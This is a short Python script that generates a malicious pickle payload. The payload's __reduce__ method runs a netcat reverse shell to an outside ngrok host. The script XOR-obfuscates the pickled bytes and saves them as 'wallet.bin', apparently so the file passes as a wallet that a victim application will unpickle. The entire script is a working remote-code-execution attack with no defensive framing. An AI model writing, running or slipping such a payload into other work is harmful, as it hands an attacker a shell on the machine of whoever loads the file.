import pickle
import os


class MaliciousCode:
    def __reduce__(self):
        import os
        return (os.system,("nc 6.tcp.eu.ngrok.io 10605 -e /bin/sh", ))


malicious_object = MaliciousCode()

encrypt_key = 'uiweiudwnhefiuwehfiuwefniwuefniuwefnwiuweojfoiwjefijwoifjwoifjowjfoiwjfijewfoijweoifjoiwjefojwfeiojwfoijwoifjwef'

data = pickle.dumps(malicious_object)
data = data + int(87).to_bytes(1, 'big')

encrypt_key_bytes = encrypt_key.encode('utf-8')
tmp = b""
for i in range(len(data)):
        tmp += bytes([data[i] ^ encrypt_key_bytes[i % len(encrypt_key_bytes)]])
data = tmp
with open('wallet.bin', 'wb') as f:
        f.write(data)
